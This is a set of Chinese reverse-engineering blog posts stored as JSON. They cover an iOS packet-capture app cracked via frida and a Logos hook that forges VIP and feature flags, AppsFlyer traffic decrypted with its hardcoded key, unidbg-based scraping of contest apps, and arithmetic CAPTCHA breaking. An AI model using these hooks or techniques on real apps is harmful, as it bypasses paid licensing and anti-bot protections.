NULL; // MUST be NULL if (bDelete) &#123; // if delete requested.. shDelFile.fFlags &amp;= ~FOF_ALLOWUNDO; // ..don't use Recycle Bin &#125; else &#123; // otherwise.. shDelFile.fFlags |= FOF_ALLOWUNDO; // ..send to Recycle Bin &#125; return SHFileOperation(&amp;shDelFile); // do it!&#125; 删除完毕后，如果存在原文件，就将原文件恢复。 命令行的话可以使用attirb，这里代码的话采用了SetFileAttributes。并使用rename将原文件恢复原名。主要代码： 12SetFileAttributes(\"gtest.exe\", FILE_ATTRIBUTE_NORMAL);rename(\"gtest.exe\", \"test.exe\"); 然后将上面的代码整合一下运行，添加日志记录。运行效果： 这里执行的是感染后的”专杀”工具，可以看到又起了一个窗口，并执行了专杀工具。最终也会将该文件恢复。图上显示的仍为g开头，需要刷新一下即可。 可以成功删除病毒文件并恢复原文件。 删除的文件放在了回收站中。但从执行情况来看，有删除失败的文件，这是由于病毒文件正在执行，所以未能删除。要删除也可以，找到对应的pid，结束任务，再进行删除。这里就不再进行操作了。 0x03 总结本文简单实现了一个病毒专杀工具，用的比较简单和基础的方法，没有涉及太多复杂的内容。可能存在问题较多，还有许多需要完善的地方，不过针对当前这款病毒查杀暂时没多大问题。最重要的一点就是如何去确定病毒的特征码，这将作为能否删除病毒文件的关键。","tags":"病毒查杀 特征码 代码开发"},{"title":"IOS逆向之某抓包APP","url":"/2022/10/21/IOS-Storm-Sniffer-Reverse/","text":"0x00 前言本文的测试目标是一个抓包的APP，可以使用hook或者代理的方式来获取高级功能，如解密HTTPS流量、重写HTTP请求以及重放等功能。由于个人账户（没有付费成为苹果开发者账号）的限制，注入打包后，无法正常使用抓包功能，因此算是一篇半成品，不过本文主要提供一些思路以及介绍一下数据之间的转换。 0x01 分析运行后发现高级功能都需要付费才可以，抓包发现请求和返回都加密了。 使用frida-ios-dump将ipa文件dump出来，之后用ida打开，发现该程序是用到了OC和swift。而且http请求采用了Alamofire，它是一个用 Swift 编写的 HTTP 网络库。 该程序较小，猜测加密函数中有encrypt关键字，于是在函数中搜索encrypt。 当然也可以根据http请求的一些内容搜索进而去定位加密的算法，在这里就不演示了。 可以看到有一些，可以使用frida-trace来追踪一下是调用了哪个方法。 1frida-trace -U -f com.xxxx -m \"*[* *encrypt*]\" 使用该命令可以看到如下调用： 经过进一步验证发现是调用了类XMXXTEA相关的加密函数。一般这样同个类存在多个加（解）密，大多数都是简单的调用复杂的。从上图就可以看出来encryptStringToBase64String:arg1 stringKey:arg2调用了encryptToBase64String:arg1 stringKey:arg2。 所以我们看 +[XMXXTEA encryptStringToBase64String:arg1 stringKey:arg2]即可。 命令如下： 1frida-trace -U -f com.xxxx -m \"+[XMXXTEA encryptStringToBase64String:stringKey:]\" 执行后可以发现与抓包的内容一致。 接下来我们看一下是否有数据的解密，同样搜decrypt 根据上面的经验，猜测解密的是+[XMXXTEA decryptBase64StringToString:stringKey:]。结果进行追踪后发现并没调用，这里解密采用的是+[XMXXTEA decryptBase64String:stringKey:]。 可以看到解密数据。 不过解密结果不是字符串类型，我们用CyberChef的hex解码后是json数据。 返回的json中有几个关键的键值可以猜出其含义。例如isVip应该是判断是否为会员，expire_on表示到期时间，auth_quantity是授权数量，function_list应该是拥有的功能，比如非会员用户只有一个抓包功能，如果要拥有解密HTTPS、重写等功能，则function_list应该是[1,2,3]。当然这些只是猜测。 尝试修改一下isVip的值为1，看是否有反应。首先看一下+[XMXXTEA decryptBase64String:stringKey:]解密返回值的类型是什么。 主要代码： 1234onLeave(log, retval, state) &#123; var ret = ObjC.Object(retval); log(`ret type is --&gt;`+ret.$className); &#125; 执行后返回的结果： 1ret type is --&gt;NSConcreteData 返回值是NSConcreteData类型的，可以看作为是NSData。修改返回值有两种方法，第一种是将NSData转化为NSString，然后利用字符串替换来修改，修改完毕后转化NSData并替换；第二种是将NSData转化为可变数组NSMutableDictionary，然后修改键的值，最后再转化NSData并替换。 下面分别看一下两种方法的OC代码，以及翻译成frida的js实现的代码。 方法一：使用NSString替换对应的主要OC代码如下： 123456NSString *str = @\"&#123;\\\"uid\\\": \\\"xxxxxxx\\\", \\\"userID\\\": \\\"xxxxx\\\", \\\"isVip\\\": 0, \\\"member_type\\\": 0, \\\"member_title\\\": \\\"\\\\u57fa\\\\u7840\\\\u7248\\\", \\\"expire_on\\\": \\\"\\\\u6682\\\\u672a\\\\u5f00\\\\u901aVIP\\\", \\\"auth_quantity\\\": 0, \\\"auth_mail\\\": null, \\\"is_primary\\\": 0, \\\"trail_status\\\": 0, \\\"function_list\\\": [1], \\\"timestamp\\\": 1666080682, \\\"ts\\\": 0&#125;\";NSData * data = [str dataUsingEncoding:NSUTF8StringEncoding];//NSString转换为NSDataNSString *oldString = [[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];//NSData转换为NSStringNSString * newString = [str stringByReplacingOccurrencesOfString:@\"\\\"isVip\\\": 0\" withString:@\"\\\"isVip\\\": 1\"];//替换字符串NSLog(@\"oldString is:\\n%@\",oldString);NSLog(@\"newString is:\\n%@\",newString); 这里为了使用NSData数据，采用的是NSString转换而来的，当然也可以采用byte来生成。主要代码： 12Byte byte[] = &#123;0x7B,..., 0x7D&#125;;NSData *byteData = [[NSData alloc] initWithBytes:byte length:sizeof(byte)/sizeof(Byte)]; OC代码执行的结果如下： 可以成功替换，翻译成frida的js实现如下： 12345678onLeave(log, retval, state) &#123; var ret = ObjC.Object(retval); var oldNSStr = ObjC.classes.NSString.alloc().initWithData_encoding_(ret, 4);//NSData转换为NSString log(`oldNSStr--&gt;`+ oldNSStr); var newNSStr = oldNSStr.stringByReplacingOccurrencesOfString_withString_('\"isVip\": 0','\"isVip\": 1');//替换字符串 log(`newNSStr--&gt;`+ newNSStr); retval.replace(newNSStr.dataUsingEncoding_(4));//NSString转换为NSData，并替换返回值&#125; 执行结果： 同时查看我的账号界面可以看到PRO标志。 但是点击解密HTTPS流量、重写等功能还是跳转到会员开通界面，这是因为这些功能是从function_list中获取的，所以想要解锁功能还需修改这里。主要代码： 12var newNSStr = oldNSStr.stringByReplacingOccurrencesOfString_withString_('\"isVip\": 0','\"isVip\": 1').stringByReplacingOccurrencesOfString_withString_('\"is_vip\": 0','\"is_vip\": 1').stringByReplacingOccurrencesOfString_withString_('\"member_type\": 0','\"member_type\": 1').stringByReplacingOccurrencesOfString_withString_('\"auth_quantity\": 0','\"auth_quantity\": 3').stringByReplacingOccurrencesOfString_withString_('\"function_list\": [1]','\"function_list\": [1,2,3,4,5]').stringByReplacingOccurrencesOfString_withString_('\\\\u6682\\\\u672a\\\\u5f00\\\\u901aVIP','2099-09-09 14:22');log(`newNSStr--&gt;`+ newNSStr); 再次执行 看到用户界面也成功变化了 高级功能也可以使用 例如重写功能，将请求的某度转到qq上 功能都是可以正常使用的。 方法二：使用NSMutableDictionary修改对应的主要OC代码如下： 1234567NSData * data = [str dataUsingEncoding:NSUTF8StringEncoding];NSMutableDictionary * result = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil];//NSData转NSMutableDictionary[result setValue:[NSNumber numberWithInt:1] forKey:@\"isVip\"];//设置isVip为1[result setValue:@\"[1,2,3,4,5]\" forKey:@\"function_list\"];//设置function_list[result setValue:@\"2099-09-09 14:22\" forKey:@\"expire_on\"];//设置expire_onNSLog(@\"oldString is:%@\",str);NSLog(@\"After Change is:%@\",result); 查看执行的结果 这里翻译成frida的js实现时，有一个问题，生成NSMutableDictionary时，由于需要传入nil，而frida中无法生成，导致这种方法不能使用。根据别人提出的方法var nil=ObjC.Object(ptr(&quot;0x0&quot;));，测试代码如下： 1234var data = ObjC.classes.NSString.stringWithString_('&#123;\"aa\":11,\"bb\":2&#125;') ;var NSJSONSerialization = ObjC.classes.NSJSONSerialization;var nil=ObjC.Object(ptr(\"0x0\"));NSJSONSerialization.JSONObjectWithData_options_error_(data,1,nil); 运行后直接崩溃，导致无法使用，因此在frida下，暂时放弃第二种方法。 分析的话到这里就结束了，但借助frida来获取高级版，不方便使用，而且无法在非越狱手机上使用，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。 0x02 编写非越狱插件编写插件采用了非越狱插件开发集成神器MonkeyDev，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。 安装和卸载可以参考https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85 安装完成后新建MonkeyApp，File-&gt;New-&gt;Project-&gt;MonkeyApp。 项目建立后将砸壳后的APP拖入到TargetApp目录下。 这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法： 123456%hook 类名- (返回值)方法名:(id)arg1 ....&#123; ...&#125;%end 根据上面的分析，这里我们需要对XMXXTEA 类的方法decryptBase64String:stringKey:进行HOOK，修改返回值，主要代码如下： 123456789101112131415161718%hook XMXXTEA+ (id) decryptBase64String:(NSString*) stringData stringKey:(NSString*) key&#123; NSLog(@\"Before : %@\", %orig); NSData *data = %orig;//NSData NSMutableDictionary *result = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil];//NSData转换NSMutableDictionary [result setValue:[NSNumber numberWithInt:1] forKey:@\"isVip\"]; [result setValue:[NSNumber numberWithInt:1] forKey:@\"member_type\"]; [result setValue:[NSNumber numberWithInt:3] forKey:@\"auth_quantity\"]; [result setValue:@\"[1,2,3,4,5]\" forKey:@\"function_list\"]; [result setValue:@\"2099-09-03 14:22\" forKey:@\"expire_on\"]; NSData *data_result= [NSJSONSerialization dataWithJSONObject:result options:NSJSONWritingPrettyPrinted error:nil]; NSLog(@\"After : %@\", data_result); return data_result;&#125;%end 其实和上面第二种方法中的OC代码一样，连接非越狱手机后使用⌘+R运行该项目。 首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书，ios16以上需要开启开发者模式，隐私安全-开发者模式，而且需要重启。 运行后，高级版功能都可以打开，但是无法开启抓包功能。 因为开启抓包需要开通网络访问权限以及VPN的相关权限，由于账号没有付费成为苹果开发者账号，因此这些权限无法使用。 苹果开发者账号可用的权限： 非开发者账号可用的权限： 这里即使把权限添加上，也会编译不通过的。 这里就需要注册成开发者账号才可以继续进行，因此就放弃了。 0x03 总结本文通过一款抓包APP借助于frida来获取高级权限，另外介绍了一下OC下NSData、NSString、NSMutableDictionary之间的数据转换，以及翻译成frida中js代码的实现。 其实也可以利用代理的方式，来修改返回包的内容，从而解锁会员功能。这里简单提供一下思路，可以借助第三方抓包软件（有重写功能的，手机上的也可以，如HTTP Catcher）。需要注意几点：一是每个设备加密key不一样，二是需要注意请求头中的t（时间戳），这个值与手机时间相差不能太多（可以修改手机时间）。大致流程就是首先获取加密算法的key，将请求头中的t、解密结果中的timestamp以及手机时间不要差太多，将修改后的数据加密后进行替换即可。或者自己搭建一个服务，将数据转发到自己服务上，解密修改后重新加密返回即可。","tags":"frida sniffer 抓包软件"},{"title":"IOS逆向之appsflyer平台解密","url":"/2022/10/13/IOS-appsflyer-decrypt/","text":"0x00 前言前段时间有这样一个需求，需要抓一下IOS端下appsflyer这个平台的数据，于是就帮忙看了一下。这里其实和APP没多大关系，需要接入appsflyer这个平台的APP就可以，然后将抓包获取的加密数据进行解密。 0x01 准备给我的并不是一个ipa文件，而是一个压缩包文件。 Payload.zip其实就是ipa文件进行解压后再压缩而来的，但是修改文件名直接安装是不行的，需要重新签名。 这里将文件重命名为1.ipa，不进行签名，然后使用命令ideviceinstaller -i 1.ipa进行安装，结果安装失败。 可以使用命令安装，也可以借助其他工具安装，如Xcode、爱思助手等。 签名的话也有多种方法，我这里使用IOS App Signer进行签名。签名后重新安装 1ideviceinstaller -i 1-sign.ipa 签名后安装成功，对比源文件与签名后文件的签名。接下来就是进行抓包分析了。 0x02 分析运行app并抓包，会发现有很多请求，但每次打开APP与appsflyer有关的请求一般有三个，可以直接过滤出来。可以看到请求的内容是乱码，应该是采用了某种加密。接下来使用ida对文件进行分析。一般都是进行关键字的搜索，然后慢慢定位找到加密相关的函数，例如这里搜索的关键字是iosevent。对比一下请求的URL，可能是第一个。一直查找引用，直到发现-[AppsFlyerLib __validateAndLogInAppPurchase:price:currency:transactionId:additionalParameters:success:failure:]进行了调用。 使用frida-trace进行追踪frida-trace -U -f cn.fuping.hhrx -m &quot;-[AppsFlyerLib __validateAndLogInAppPurchase:price:currency:transactionId:additionalParameters:success:failure:]&quot;。这里仍有三个appsflyer相关的请求，但是发现并没有对该方法进行调用，因此可能是找错了。 通过查看请求，可以看到Content-Type是application/octet-stream，所以也可去搜索application/octet-stream。搜索application/octet-stream。 一直查找引用，最终定位在-[AppsFlyerHTTPClient sendEvent:completionHandler:]方法中。 在其中也可以看到调用了与加密相关的内容-[AFSDKEvent encryptWithData:]。使用frida-trace进行追踪关键代码： 1234567891011&#123; onEnter(log, args, state) &#123; var arg2ObjC = ObjC.Object(args[2]); var arg2 = Memory.readUtf8String(arg2ObjC.bytes(), arg2ObjC.length()); log(`-[AFSDKEvent encryptWithData:$&#123;arg2&#125;]`); &#125;, onLeave(log, retval, state) &#123; log(`-[AFSDKEvent encryptWithData:-&gt;result-&gt;$&#123;ObjC.Object(retval)&#125;]`); &#125;&#125; 可以成功获取加密前的数据加密后的结果也是一致的。接下来就是看加密是如何实现的，另外能否进行解密。进入到-[AFSDKEvent encryptWithData:]方法，看是如何进行加密的。通过分析发现其调用了-[AFSDKEvent key]获取key，这里key是固定的，为X3sgfYhYXWhDoD8DhW2aaJ。然后调用+[AppsFlyerAES128Crypto encrypt:withObject:]进行加密。继续跟进加密的方法。 1CCCrypt(0LL, 0LL, 1LL, v19, v20, v22, v24, v25, v27, v28, &amp;v35) 这里看到了CCCrypt函数的调用，可以先了解一下该函数，然后分析加密流程。使用CCCrypt进行加密时，需要引入CommonCrypto/CommonCryptor.h框架。其中CCCrypt函数定义： 123456789101112CCCryptorStatus CCCrypt( CCOperation op, /* kCCEncrypt, etc. */ CCAlgorithm alg, /* kCCAlgorithmAES128, etc. */ CCOptions options, /* kCCOptionPKCS7Padding, etc. */ const void *key, size_t keyLength, const void *iv, /* optional initialization vector */ const void *dataIn, /* optional per op and alg */ size_t dataInLength, void *dataOut, /* data RETURNED here */ size_t dataOutAvailable, size_t *dataOutMoved) 一共有11个参数，参数简要说明如下： 参数 说明 备注 CCOperation op 加密(kCCEncrypt=0) 解密(kCCDecrypt=1) 这里是加密 CCAlgorithm alg 加解密算法标准 kCCAlgorithmAES128=0, kCCAlgorithmAES=0 这里为kCCAlgorithmAES128或者kCCAlgorithmAES加密 CCOptions options 加密方式的选项 kCCOptionPKCS7Padding表示CBC kCCOptionECBMode表示ECB kCCOptionPKCS7Padding&#124;kCCOptionECBMode表示ECB且PKCS7Padding填充 这里为CBC加密，且用PKCS7Padding进行填充 const void *key 加密密钥 固定值 size_t keyLength 密钥长度 const void *iv iv 初始化向量，ECB 不需要指定 随机值 const void *dataIn 加密的数据 size_t dataInLength 加密的数据长度 void *dataOut 缓冲区（地址），存放密文的 size_t dataOutAvailable 缓冲区的大小 size_t *dataOutMoved 加密结果大小 然后转过头来分析加密的流程。首先调用了+[AppsFlyerAES128Crypto randomDataOfLength:]生成了一个16byte的随机字符作为iv。接着调用+[AppsFlyerAES128Crypto AESKeyForPassword:salt:]对key进行解密，解密后的的结果作为加密的key值，为84adf6ec41acb6cbeb349d0a7078f0d2。最后调用CCCrypt进行加密，加密方法是AES-CBC。加密完成后将IV和8位00与加密数据进行拼接。所以可以直接根据请求的数据进行解密。例如上面的请求包共分为三部分，第一部分为加密后的内容，第二部分为IV，长度为16，这里是b820980ed08844945179a96721bbbcd3，第三部分为0，长度为8。然后进行解密：成功解密数据，到这里任务就完成了。其实在搜索的时候也可以搜索其他关键字，例如buildnumber。被圈中的两个字符串与URL进行对比，相似度很高。可以进一步去分析查找引用进行分析。另外这里的加密用到了CCCrypt函数，所以也可以直接对其进行追踪，例如 1frida-trace -U -f xxxx -i CCCrypt 然后修改libcommonCrypto.dylib下的CCCrypt.js文件，主要代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&#123; onEnter: function (log, args, state) &#123; log('CCCrypt(' + 'op=' + args[0] + ', alg=' + args[1] + ', options=' + args[2] + ', key=' + args[3] + ', keyLength=' + args[4] + ', iv=' + args[5] + ', dataIn=' + args[6] + ', dataInLength=' + args[7] + ', dataOut=' + args[8] + ', dataOutAvailable=' + args[9] + ', dataOutMoved=' + args[10] + ')'); //保存参数 this.operation = args[0] this.CCAlgorithm = args[1] this.CCOptions = args[2] this.keyBytes = args[3] this.keyLength = args[4] this.ivBuffer = args[5] this.inBuffer = args[6] this.inLength = args[7] this.outBuffer = args[8] this.outLength = args[9] this.outCountPtr = args[10] //this.operation == 0 代表是加密 if (this.operation == 0) &#123; //打印加密前的原文 console.log(\"In buffer:\") console.log(hexdump(ptr(this.inBuffer), &#123; length: this.inLength.toInt32(), header: true, ansi: true &#125;)) //打印密钥 console.log(\"Key: \") console.log(hexdump(ptr(this.keyBytes), &#123; length: this.keyLength.toInt32(), header: true, ansi: true &#125;)) //打印 IV console.log(\"IV: \") console.log(hexdump(ptr(this.ivBuffer), &#123; length: this.keyLength.toInt32(), header: true, ansi: true &#125;)) &#125; &#125;, onLeave: function (log, retval, state) &#123; &#125;&#125; 效果如下：也是可以进行加密数据的解析。 0x03 总结本文主要涉及部分内容，一是ios APP签名，另外就是加密函数CCCrypt。该函数是IOS加密中常用的函数，在分析的时候可以直接使用frida-trace -U -f xxxx -i CCCrypt来查看加密是否调用了该函数，然后进行数据解密。","tags":"frida appsflyer cccrypt"},{"title":"记一次APP爬虫比赛","url":"/2022/07/07/YRX-APP-MATCH/","text":"0x01 前言5月中旬的时候，猿人学举行了一个APP爬虫大赛，共设10题，主要涉及Android反混淆，双向认证，tls指纹对抗等技术。而且只需要答对一题就有参与奖，即可获得一件猿人学定制T恤。另外第一题不涉及so，仅涉及java层加密。为了T恤，立马去报了名参赛。 0x02答题比赛开始的时候，想着下载完APP，然后冲完第一题就完事，但结果发现APP安装都成问题。 查看规则才知道，参赛的APP只支持arm64架构的手机，我的Nexus 5根本不支持。还好身边有一个marry大佬尊贵的荣耀8，成功安装了APP。但是又出现了另外的问题，由于手机是安卓版本8.0，也没有root，配置完代理无法抓到该程序的包。对于未root抓包的话，也有很多其他的解决方法，例如可以使用VMOS Pro，也可以使用VirtualXposed结合xposed插件来抓包，或者利用objection重新打包，之后就可以使用objection来进行测试。实际上不用抓包也是可以做出几道题的，需要搞清楚请求的参数即可，首先来看第一题。 第一题虽说第一题不涉及so，仅包含java层的加密，但这道题做起来也有一点麻烦，需要抠代码和修改。首先来看一下题目：10道题都是要爬取1-100页之间的数据，然后求和。由于APP没有加壳，所以可以直接使用jadx来打开，可以看到代码进行了混淆。 使用adb shell dumpsys activity top来找到当前打开的界面，从而定位到com.yuanrenxue.match2022.fragment.challenge.ChallengeOneFragment 进入到com.yuanrenxue.match2022.fragment.challenge.ChallengeOneFragment中。 可以很容易就发现加密的关键点，调用了com.yuanrenxue.match2022.security.Sign的sign方法对一些参数进行了加密。这里sign方法传入的参数是sb.toString().getBytes(StandardCharsets.UTF_8)，而sb可以从上面获取。主要代码： 12345StringBuilder sb = new StringBuilder(); sb.append(\"page=\"); sb.append(this.page); long longValue = c3756OooOO0O.OooO00o().longValue(); sb.append(longValue); 由代码可以看出，sb.toString()的内容就是page=拼接当前页码，和当前时间戳组成的。进入到o0O0ooO.AbstractC4864OooO0O0的OooO00o方法。可以发现http请求的接口和参数，经过拼接后请求的url是https://appmatch.yuanrenxue.com/app1，参数一共有3个。分别为当前页码page、加密结果sign以及时间戳t，重点看一下如何加密获取sign值的。 使用抓包的话很容易就定位到这里，当时没有抓包，经过尝试也是可以获取到请求的URL。 进入com.yuanrenxue.match2022.security.Sign.sign方法，这里推荐用idea打开，可以少走一些弯路。可以对比看一下jadx和idea打开的效果，这里就不放图了。下面是使用idea打开的效果：从群里发现有老师傅发出抓包请求的内容，刚好可以供我们进行测试。请求的内容:page=1&amp;sign=837056ab8650736b103f193d95ebbc3c&amp;t=1652444336，看起来sign像是md5，经验证发现并不是。如果直接调用反编译后的new com.yuanrenxue.match2022.security.Sign().sign()方法，结果也是不正确的。主要原因可能是因为这些内容是反编译过来的，有些内容可能有所变动。这里的思路是把用到的方法拎出来，然后进行修改。扒完之后一共有这几个文件：当然运行结果也不是正确的。经过对比，用idea和jadx打开的f方法内容是不一样的：将内容修改后，可以成功获取到正确的sign值。 剩下的就简单了，请求1-100页，获取到每页的数据然后求和。这里仅演示获取第一页的数值。 做完了第一题后又看了一下其他的题，发现第二题、第三题、第八题通过使用unidbg可以很直接的得出结果，第五题采用了双向证书，直接抠代码也是可以做出来。第二题、第三题、第八题做题思路一样，所以放一起来说，最后再说第五题。 第二题第二题就涉及到了so，这不禁令人头大。搞了好久so文件才发现规则中允许使用unidbg，用其调用so的话简单快捷。这里没有好兄弟发请求的数据了，只能自己动手抓包了。由于要对app进行抓包和hook查看参数，因此objection将frida-gadget.so打包进apk中，使用命令为：objection patchapk --source yuanrenxuem106.apk。然后就可以利用 objection对app进行分析了。通过查看反编译后的代码，第二题的话请求一共有3个参数:page、ts、sign，page是页码，ts是时间戳，sign是加密的内容。可以看到sign是经过了调用so的加密结果，使用objection查看加密传入的参数。android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeTwoFragment.sign --dump-args传入的参数是由page和ts进行了拼接，中间由:连接。知道了调用so的传入的参数，下面就开始用unidbg进行调用。 123456789101112131415161718192021222324252627282930public class ChallengeTwoFragment extends AbstractJni &#123; private final AndroidEmulator emulator; private final VM vm; private final Memory memory; private final Module module; public ChallengeTwoFragment() &#123; emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); memory = emulator.getMemory(); memory.setLibraryResolver(new AndroidResolver(23)); vm = emulator.createDalvikVM(new File(\"file/app/yuanrenxuem106.apk\")); vm.setDvmClassFactory(new ProxyClassFactory()); // 加载so到虚拟内存 DalvikModule dm = vm.loadLibrary(\"match02\", true); module = dm.getModule(); vm.callJNI_OnLoad(emulator, module); &#125; public String callSign(String data) &#123;//通过符号 DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, this); DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, \"sign(java/lang/String;)java/lang/String;\", data); String result = (String) dvmObject.getValue(); return result; &#125; &#125; unidbg调用so很简单，直接根据demo修改一下就行，需要注意的是要启动64位的模拟器。获取第一页的数据： 第三题第三题的话和第二题类似，so文件虽然进行了加密混淆，但是可以直接使用unidbg来调用so文件。首先找到第三题的请求参数，一共两个参数page和m。参数m的值是通过crypto来进行加密的，一共两个参数，类型分别为String和long。查看一下传入的两个参数内容，使用命令：android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeThreeFragment.crypto --dump-args发现第一个参数是页码与时间戳乘以1000来进行拼接的，同时如果页码长度不为3时，需要前面补零，第二个参数为时间戳乘以1000。第三题和第二题是同样的套路，直接修改一下就可以使用，主要代码： 123456public String callCrypto(String data,long l) &#123;//通过符号 DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, this); DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, \"crypto(Ljava/lang/String;J)Ljava/lang/String;\", data,l); String result = (String) dvmObject.getValue(); return result; &#125; 获取第一页的数据： 第八题第八题与第二题、第三题都是类似的，只不过是so多加了一层upx壳，脱壳后可以通过unidbg来调用。脱壳命令：upx -d libmatch08.so查看第八题的参数，发现只有一个参数s。通过分析参数s是调用native层的data方法来进行加密的，传入的是页码。通过objection来验证一下：android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeEightFragment.data --dump-args --dump-return发现data方法传入的就是页码，然后使用unidbg来直接调用so文件，主要代码： 123456public String callData(int i) &#123;//通过符号 DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, this); DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, \"data(I)Ljava/lang/String;\", i); String result = (String) dvmObject.getValue(); return result; &#125; 获取第一页的数据： 第五题第五题的话也不难，从网上copy一个双向证书请求的代码就可以来完成。但需要注意几点：一是请求的URL有所变化，二是要找到key，三是如果用java来写的话，要注意jdk的版本，当时就是由于jdk的版本导致当时没做出来，换了个jdk版本，立马就出来结果了。首先来分析参数，可以看出来请求的路径有所变化，参数的话只有一个，就是页码page。通过抓包，可以看到URL也变化了：通过hook查看一下key的值：android hooking watch class_method javax.net.ssl.KeyManagerFactory.init --dump-args发送请求的代码： 1234567891011121314151617181920212223242526272829303132public static String appmatch05(String url, int page) throws IOException &#123; String result = null; InputStream[] insCerArry = new InputStream[]&#123;&#125;; InputStream insJksDir = new FileInputStream(\"file/cer/clientCA.bks\"); HttpsUtils.SSLParams sslParams = HttpsUtils.getSslSocketFactory(insCerArry, insJksDir, \"MZ4cozY8Qu32UzGe\"); OkHttpClient okHttpClient = new OkHttpClient.Builder() .hostnameVerifier(new HostnameVerifier() &#123; @Override public boolean verify(String hostname, SSLSession session) &#123; return true; &#125; &#125;) .sslSocketFactory(sslParams.sSLSocketFactory, sslParams.trustManager) .build(); RequestBody formBody = new FormBody.Builder() .add(\"page\", page + \"\") .build(); // 表单键值对 Request request = new Request.Builder().url(url).post(formBody).build(); // 请求 Response response = okHttpClient.newCall(request).execute(); if (response.isSuccessful()) &#123; result = response.body().string(); &#125; return result; &#125; HttpsUtils网上搜索一个抄下来就可以用了。请求第一页数据：需要注意使用的java版本，使用jdk1.8.0_111时，就会爆下面的错误：当时比赛的时候用的jdk1.8.0_111，一直报错，导致找了好多关于双向证书的代码都不行，在比赛结束后，换了jdk版本同样的代码，立即就好了。 0x03总结本文主要是通过一次APP爬虫的比赛，一方面提供了对于Android 7 及以上系统抓包的一种思路，二是unidbg的初级使用，还有就是双向证书的问题。对于其他grpc、quic、tls等，还需要更深入的学习。另外还要感谢王老板提供这次学习的机会。 0x04参考[1] unidbg:https://github.com/zhkl0228/unidbg[2] objection:https://github.com/sensepost/objection/wiki/Patching-Android-Applications[3] 比赛地址:http://appmatch.yuanrenxue.com/","tags":"猿人学 unidbg objection"},{"title":"记一次简单计算验证码的识别过程","url":"/2022/01/19/Calculate-Captcha-Recognition/","text":"0x00 前言某CMS的验证码是简单的计算验证码，都是一位数的加减乘除运算，之前尝试用分割的方法识别，但成功率较低。后来采用了pytorch训练后进行识别，可以达到98%以上的识别率，于是整理一下过程，水一篇文章。 0x01 验证码的获取首先是验证码的获取，由于爬取验证码还要手工标注，比较麻烦，这里可以通过修改程序来批量生成标注好的样本。 主要代码如下： 123456789101112import com.google.code.kaptcha.Producer;public class GenCalculateCaptcha &#123; public static void main(String[] args) &#123; Producer kaptcha = new CaptchaConfig().getKaptchaBeanMath(); for(int i=0;i&lt;100;i++)&#123; String capText = kaptcha.createText(); String capStr = capText.substring(0, capText.lastIndexOf(\"@\")); System.out.println(capStr); &#125; &#125;&#125; 执行结果： 123456789106-1&#x3D;?9+1&#x3D;?0+5&#x3D;?8*6&#x3D;?6&#x2F;1&#x3D;?5+7&#x3D;?9+3&#x3D;?0&#x2F;5&#x3D;?1*2&#x3D;?... 通过执行的结果可以发现，生成的验证码中会出现*、/、?等字符，这些字符在作为文件名时不合法，所以需要进行替换。 例如将除号/替换为÷，乘号*替换为×，问号?替换为？。 同时为了避免生成的验证码重复，生成的文件名拼接了时间戳的md5，并用_连接。 替换的代码如下： 1String newCapStr = capStr.replace(\"/\",\"÷\").replace(\"*\",\"×\").replace(\"?\",\"？\") + \"_\" + DigestUtils.md5Hex(\"\"+System.currentTimeMillis())+\".jpg\"; 再次执行结果如下： 12345678910118×4&#x3D;？_b69426246067db177639de42b77082ab.jpg3÷1&#x3D;？_d0ad2c5c50b4d8db2736093bdf2c08e8.jpg6÷3&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg3×8&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg9-3&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg2-0&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg0+9&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg4-1&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg6+2&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg7×2&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg... 然后就是验证码图片的保存。 主要代码如下： 123BufferedImage bi = DefaultKaptcha.createImage(capStr);String fileName = dir.getPath()+File.separator+capStr.replace(\"/\",\"÷\").replace(\"*\",\"×\").replace(\"?\",\"？\") + \"_\" + DigestUtils.md5Hex(\"\"+System.currentTimeMillis())+\".jpg\";ImageIO.write(bi, \"jpg\", new File(fileName)); 生成的验证码如下： 到此获取标注好的验证码已经完成了，下面就开始进行验证码的识别。 0x02 验证码的识别1.分割识别最早是根据文章《自动识别验证码破解上学吧题目答案》中的方法来进行验证码的识别，但是由于验证码不太规则，导致识别效果较差，后面就放弃了。这里列出简要过程。 验证码图片为 60×160 像素的，两个数字的范围都是 0 到 9。对图片转成灰度图后并进行分割。 123image &#x3D; Image.open(path).convert(&quot;L&quot;)cropped_image1 &#x3D; image.crop((25, 13, 50, 44)) # 第一个数字的切图cropped_image2 &#x3D; image.crop((65, 13, 90, 44)) # 第二个数字的切图 可以自己找比较合适的分割位置。 分割的效果： 然后进行二值化，遍历灰度图的像素点，这里以阈值66为界限，使得图片的像素点要么为纯黑 0，要么为纯白 255，下图是二值化之后的图片： 接着对验证码样本进行批量切图、转灰度图、二值化： 批量对图片进行分割，然后保存格式为数字_md5(时间戳).jpg 1234567891011def corpImg(name): imgPath = \"MathCodes/\" + name fname = name[0:1] img = cv2.imread(imgPath, 0) # 